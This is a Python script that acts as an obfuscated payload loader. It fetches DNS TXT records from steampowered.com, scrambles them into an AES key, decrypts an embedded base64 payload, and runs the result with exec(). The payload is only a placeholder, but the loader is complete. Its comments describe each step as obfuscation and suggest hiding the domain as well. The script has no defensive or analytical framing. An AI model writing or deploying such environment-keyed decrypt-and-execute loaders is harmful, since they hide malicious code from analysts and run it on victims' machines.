import dns.resolver  # Import the library for DNS queries.
import hashlib  # Import the library for hashing functions.
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # Import cryptographic primitives for encryption/decryption.
from cryptography.hazmat.backends import default_backend  # Import the default backend for cryptographic operations.
from cryptography.hazmat.primitives import padding  # Import padding utilities for block ciphers.
import base64  # Import the library for base64 encoding/decoding.

# Function to fetch TXT records for a given domain.
def fetch_txt_records(domain):
    try:
        answers = dns.resolver.resolve(domain, 'TXT')  # Perform a DNS query for TXT records.
        # Strip quotes and extract TXT records, storing them in a list.
        records = [r.to_text().strip('"') for r in answers]
        return records
    except Exception as e:
        # In case of a query failure, log the error.
        print(f"Error fetching TXT records: {e}")
        return []

# Function to obscurely merge a list of strings.
def obscure_merge(records):
    if not records:
        return ""  # Return an empty string if the record list is empty.
    # Reverse the first record and prepare to merge with others.
    first_record = records[0][::-1]
    # Reverse and merge all subsequent records for added obfuscation.
    merged = ''.join([record[::-1] for record in records[1:]])
    half = len(first_record) // 2  # Calculate the midpoint of the first record.
    # Combine the first half of the reversed first record, merged others, and the second half.
    return first_record[:half] + merged + first_record[half:]

# Function to hash the merged string using SHA-256 with an added layer of obfuscation.
def hash_obfuscated(merged_str):
    reversed_str = merged_str[::-1]  # Reverse the merged string for obfuscation.
    hasher = hashlib.sha256()  # Initialize the SHA-256 hash object.
    hasher.update(reversed_str.encode('utf-8'))  # Hash the reversed, encoded string.
    return hasher.hexdigest()  # Return the hexadecimal digest of the hash.

# Function to decrypt data using the derived hash.
def decrypt_data(encrypted_data, key):
    key = key[:32].ljust(32, '\0').encode()  # Ensure the key is 32 bytes for AES-256, padding with null bytes if necessary.
    iv, encrypted_data = encrypted_data[:16], encrypted_data[16:]  # Extract the IV and the actual encrypted data.
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())  # Initialize the cipher with the key and IV.
    decryptor = cipher.decryptor()  # Create a decryptor object.
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()  # Decrypt the data and finalize the decryption.
    unpadder = padding.PKCS7(128).unpadder()  # Initialize the unpadder for PKCS7 padding.
    decrypted_data = unpadder.update(padded_data) + unpadder.finalize()  # Remove padding from the decrypted data.
    return decrypted_data  # Return the decrypted, unpadded data.

# Main execution block.
if __name__ == "__main__":
    domain = "steampowered.com"  # Domain to fetch TXT records from. Consider obfuscating or dynamically determining this value.
    encrypted_data_b64 = "Your_Base64_Encoded_Encrypted_Data_Here"  # Placeholder for the base64-encoded encrypted payload. Replace with actual data.

    # Fetch, merge, and hash TXT records.
    txt_records = fetch_txt_records(domain)  # Fetch TXT records for the domain.
    merged_records = obscure_merge(txt_records)  # Obscurely merge the fetched TXT records.
    final_hash = hash_obfuscated(merged_records)  # Generate an obfuscated hash from the merged records.

    # Decode, decrypt, and execute the encrypted payload.
    encrypted_data = base64.b64decode(encrypted_data_b64)  # Decode the base64-encoded encrypted data.
    decrypted_code = decrypt_data(encrypted_data, final_hash)  # Decrypt the data using the derived hash.
    
    try:
        exec(decrypted_code.decode())  # Execute the decrypted Python code. Consider safety checks here to prevent executing malicious code.
    except Exception as e:
        print(f"Error executing decrypted code: {e}")  # Log any errors during execution.
